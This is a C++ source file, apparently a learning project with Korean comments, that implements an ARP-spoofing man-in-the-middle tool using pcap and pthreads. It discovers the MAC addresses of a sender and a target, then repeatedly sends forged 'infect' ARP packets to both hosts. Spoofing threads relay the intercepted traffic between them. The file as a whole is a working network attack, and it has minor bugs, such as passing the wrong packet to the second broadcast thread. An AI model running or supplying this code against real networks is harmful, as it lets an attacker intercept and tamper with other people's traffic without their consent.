// todo header chore
#include <pcap.h>
#include "send.h"
#include "mac.h"
#include "ip.h"
#include <pthread.h>
#include <unistd.h>

#include <iostream>
#include <csignal>

#define PACKET_SLEEP_INTERVAL 5
#define PACKET_INFECT_INTERVAL 60

pcap_t *handle;

// for thread terminate
// can be list if paralled execute
int received;
int received2;
int rc[1024];

void *threadSendArp(void *param)
{
    EthArpPacket *bc_pkt = (EthArpPacket *)param;
    while (!received)
    {
        bc_pkt->send(handle);
        sleep(PACKET_SLEEP_INTERVAL);
    }
    printf("arp send end\n");
};

void *threadSendArp2(void *param)
{
    EthArpPacket *bc_pkt = (EthArpPacket *)param;
    while (!received2)
    {
        bc_pkt->send(handle);
        sleep(PACKET_SLEEP_INTERVAL);
    }
    printf("arp send end\n");
};

// void* arpInfect_th()
void *threadInfect(void *param)
{
    EthArpPacket *inf_pkt = (EthArpPacket *)param;
    while (1)
    {
        inf_pkt->send(handle);
        sleep(PACKET_INFECT_INTERVAL);
    }
}

int main(int argc, char const *argv[])
{
    if (argc < 4 || argc % 2 == 1)
        usage();

    Mac attackerMac;
    Ip attackerIp;
    getDeviceAddress(argv[1], &attackerIp, &attackerMac);
    printf("attacker ip %s\n", std::string(attackerIp).c_str());
    printf("attacker mac %s\n", std::string(attackerMac).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }

    // preprocess done

    int schedule = 2;
    Ip senderIp = Ip(const_cast<char *>(argv[schedule]));
    Ip targetIp = Ip(const_cast<char *>(argv[schedule + 1]));

    int received[2];

    pthread_t bc_threads[2];
    pthread_t inf_threads[2];
    pthread_t spoof_threads[2];
    pthread_t producer;

    pthread_mutex_t pipe_m[2];
    pthread_cond_t pipe_c[2];

    pthread_attr_t attr;
    if (int err = pthread_attr_init(&attr))
        fprintf(stderr, "couldn't pthread_attr_init error with %d\n", err);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
    printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
    if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &bc_pkt) != 0)
        printf("thread A create fail : %d\n", err);

    Mac senderMac = receiveArpReply(handle, senderIp, &received[0]);
    printf("sender mac address get : %s\n", std::string(senderMac).c_str());

    EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
    if (int err = pthread_create(&inf_threads[0], &attr, threadInfect, &inf_pkt) != 0)
        printf("thread A create fail : %d\n", err);
    printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());

    //----

    EthArpPacket bc_pkt1 = EthArpPacket::broadcastPacket(attackerMac, attackerIp, targetIp);
    printf("broadcast packet sending to target %s...\n", std::string(targetIp).c_str());
    if (int err = pthread_create(&bc_threads[1], &attr, threadSendArp2, &bc_pkt) != 0)
        printf("thread A create fail : %d\n", err);

    Mac targetMac = receiveArpReply(handle, targetIp, &received[1]);
    printf("target mac address get : %s\n", std::string(targetMac).c_str());

    EthArpPacket inf_pkt1 = EthArpPacket::infectPacket(attackerMac, targetMac, targetIp, senderIp);
    if (int err = pthread_create(&inf_threads[1], &attr, threadInfect, &inf_pkt1) != 0)
        printf("thread A create fail : %d\n", err);
    printf("infect thread opened to target %s...\n", std::string(targetIp).c_str());

    // pcap sniff start
    ProduceParam pparam = {handle, attackerMac};
    if (int err = pthread_create(&producer, NULL, producePacket, &pparam) != 0)
        printf("thread producer fail : %d\n", err);
    printf("producer thread start\n");

    pthread_mutex_init(&pipe_m[0], NULL);
    pthread_cond_init(&pipe_c[0], NULL);
    registerMac(senderMac, &pipe_c[0], &pipe_m[0]);

    pthread_mutex_init(&pipe_m[1], NULL);
    pthread_cond_init(&pipe_c[1], NULL);
    registerMac(targetMac, &pipe_c[1], &pipe_m[1]);

    SpoofParams sp = {handle, attackerMac, senderMac, targetMac};
    if (int err = pthread_create(&spoof_threads[0], &attr, spoof, &sp) != 0)
        printf("thread e create fail : %d\n", err);
    printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());

    SpoofParams sp2 = {handle, attackerMac, targetMac, senderMac};
    if (int err = pthread_create(&spoof_threads[1], &attr, spoof, &sp2) != 0)
        printf("thread f create fail : %d\n", err);
    printf("spoofing %s -> %s\n", std::string(targetIp).c_str(), std::string(senderIp).c_str());

    signal(SIGINT, NULL);
    // temp
    while (true)
    {
        printf("main thread...\n");
        sleep(10);
    }
    return 0;
}

// 리턴값 = pthread_create(스레드 아이디, 스레드 속성, 실행 함수, 스레드 함수 인자)
// int pthread_create(pthread_t *th_id, const pthread_attr_t *attr, void *함수명, void *arg);
// pthread_create 함수의 리턴값이 0이면 성공, 아니면 실패다.
// threadErr = pthread_create(&tA, NULL, threadA, NULL);
// if (threadErr != 0)
// {
//     printf("thread A create fail : %d\n", threadErr);
// }

// 스레드 종료를 기다림
// 리턴값 = pthread_join(스레드 아이디, 스레드 리턴 값)
// int pthread_join(pthread_t th_id, void **thread_return);
// pthread_join 함수의 리턴값이 0이면 성공, 아니면 실패다.
